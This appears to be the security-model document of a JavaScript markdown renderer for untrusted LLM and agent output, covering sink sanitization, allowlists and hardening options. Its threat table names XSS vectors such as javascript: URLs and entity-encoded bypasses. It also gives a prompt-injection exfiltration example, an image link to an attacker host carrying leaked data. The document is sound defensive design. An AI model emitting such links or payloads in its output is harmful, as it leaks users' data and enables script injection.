# Security model

`@copse/streaming-markdown` renders **untrusted** input — LLM/agent output and
user text — so its output is treated as untrusted and gated at a single, narrow
boundary. This document describes that boundary, the threats it defends against,
and the knobs a host uses to harden further. For the design rationale see
[ARCHITECTURE.md](ARCHITECTURE.md) and
[decisions/0002-raw-html-passthrough-default.md](decisions/0002-raw-html-passthrough-default.md).

## The model: sanitize at the sink

The renderer assembles HTML by string concatenation, which is inherently
fragile, so **the output is never trusted on its own**. Exactly one gate decides
what reaches the DOM: the **sink sanitizer** (`sanitizeRenderedMarkdown`), which
parses the rendered HTML and drops everything outside a narrow tag/attribute
allowlist. Anything that slips through the string assembly — a mis-escaped
payload, an unexpected tag — is removed there.

- **`renderMarkdown()` is the safe default.** It returns already-sanitized
  `SanitizedHtml` (a branded type) ready for an `innerHTML` sink, and **throws
  rather than return unsafe HTML** when no sanitizer backend is available
  (fail-closed). The streaming emitters (`StreamingMarkdownRenderer`,
  `renderStreamingMarkdown`) sanitize at their sinks the same way.
- **`renderMarkdownUnsafe()` is the raw, DOM-free path.** Its name is the
  warning: it returns untrusted HTML for hosts that own their own sanitization
  boundary (SSR, snapshots). Never assign it to `innerHTML` without passing it
  through `sanitizeRenderedMarkdown` first — or use `htmlPolicy: 'escape'` to
  literalize raw HTML for a sink you can't sanitize.

The sanitizer is pluggable (`SanitizerBackend`): the browser's native Sanitizer
API (zero-dependency default) or DOMPurify. **Both enforce the same allowlist and
the same per-element gate**, so the security posture is backend-independent.

## Threat model

| Threat | Defense |
| --- | --- |
| `<script>`, event handlers (`onclick`, …), arbitrary/unknown tags | Not on the sink allowlist — stripped or unwrapped. The allowlist mirrors exactly what the renderer is meant to emit (prose + GFM tables + code + math/mermaid scaffolding). |
| `javascript:` / `data:` / `vbscript:` in a markdown link or image | Scheme allowlist (`safeLinkHref`), applied **after** decoding HTML entities and backslash escapes, so `&#x6a;avascript:` and friends are caught before the check. Default schemes: `http(s)`, `mailto`, `tel`, `sms`, `ftp(s)`. |
| Raw HTML in the input (`<div>`, `<img onerror>`, …) | Passthrough by default — the renderer emits well-formed tags and the sink is the sole arbiter (allowlisted → element, else stripped/unwrapped). `htmlPolicy: 'escape'` literalizes it instead. The allowlist is **not** widened by passthrough. |
| DOM clobbering via attacker `id` (shadowing `document.forms`, etc.) | The per-element gate strips every `id` outside the renderer-emitted footnote shape (`fn-…` / `fnref-…`). No attacker-chosen id survives. |
| Interactive/form injection via `<input>` | The gate keeps only the fixed read-only GFM task-list checkbox (`type=checkbox disabled`); any other `<input>` is dropped. |
| Exfiltration via image/link destination (a prompt-injection classic: `![](https://attacker/?leak=…)`) | Opt-in **link/image origin policy** (`linkImagePolicy`) restricts which origins links/images may resolve to, compared after WHATWG canonicalization (credential-stripping, punycode, `\`→`/`, scheme-relative) so the usual allowlist bypasses fail. `data:` images can be blocked too. |
| Trusted Types enforcement (`require-trusted-types-for 'script'`) | Every internal `innerHTML` write routes through one chokepoint that **blesses only sanitizer output** with a Trusted Types policy (a lazily created `streaming-markdown` policy, or a host policy via `trustedTypesPolicy`). No raw string reaches an injection sink. |
| Streaming — a partial/unbalanced tag mid-stream | Forming tags are held out of the visible tail until they close; the frozen-tail path never closes an unbalanced element early, and every committed frame is byte-identical to a full sanitized render. No partial or unsanitized element is ever attached. |

## Trust boundaries

The sink allowlist is the boundary. Two kinds of content are injected **after**
it and are therefore an explicit, documented trust decision, not a gap:

- **Mermaid SVG and KaTeX HTML** are produced by their libraries and injected
  post-sanitization (KaTeX runs with `trust: false`). If you register those
  backends you are trusting them with the fenced/math source; the
  `transformSvg` / `transformHtml` hooks are the seam for a host that wants to
  re-sanitize.
- **Host extensions** (`sanitizeExtension`, `rawImageRenderer`, custom fence
  handlers, inline passes) can widen the allowlist or inject markup. They remain
  behind the same sink — keep any widening as narrow as the markup you emit.

The `SanitizedHtml` brand is a compile-time signal that a string has passed the
sink; the only way to mint one is through the sanitizer (the escape hatch is
non-exported and greppable).

## Hardening knobs

All of these are **per-render** (pass on `renderMarkdown` / the streaming entry
points) or process-wide (the matching `set*`), so two consumers in one process
can hold different policies without bleed (see [#137 / ADR 0003](decisions/0003-config-scope-global-vs-instance.md)):

- `safeHrefSchemes` — narrow the scheme allowlist (e.g. `['https', 'mailto']`).
  Narrowing is always safe; only add schemes that are inert as an `href`.
- `linkImagePolicy` — origin allowlist for links/images (the exfiltration
  defense above). Off by default.
- `sanitizeExtension` — widen the allowlist / add a per-element gate for
  host-injected markup. Keep it minimal; it is part of the security boundary.
- `trustedTypesPolicy` — supply a host Trusted Types policy when your CSP does
  not allowlist the default policy name.
- `htmlPolicy: 'escape'` — literalize all raw HTML (the pre-passthrough
  behavior) for a host that consumes the renderer string without a sink.

## What the host is responsible for

- Use `renderMarkdown` (or sanitize `renderMarkdownUnsafe` output yourself).
  Never write raw `renderMarkdownUnsafe` output to `innerHTML`.
- Provide a sanitizer backend where the native Sanitizer API is absent (Node,
  older browsers): the DOMPurify backend. Without one, `renderMarkdown` throws.
- If you register a mermaid/KaTeX/highlighter backend, you accept its output as
  trusted (post-sink). Pin and review those dependencies.

## Known considerations

- **Angle autolinks (`<scheme:…>`) use a deny-list**, not the markdown-link
  allowlist: they reject `javascript:`/`data:`/`vbscript:` but permit other
  schemes (e.g. `file:`). This is a deliberate CommonMark-conformance divergence
  and is tracked in [#139](https://github.com/copse-dev/streaming-markdown/issues/139);
  a host that needs a strict scheme allowlist for autolinks should be aware of
  it. (Markdown links `[x](…)` always use the allowlist.)

## Reporting a vulnerability

Please report security issues privately via the repository's security advisories
(GitHub → **Security → Report a vulnerability**) rather than a public issue, so a
fix can ship before disclosure.
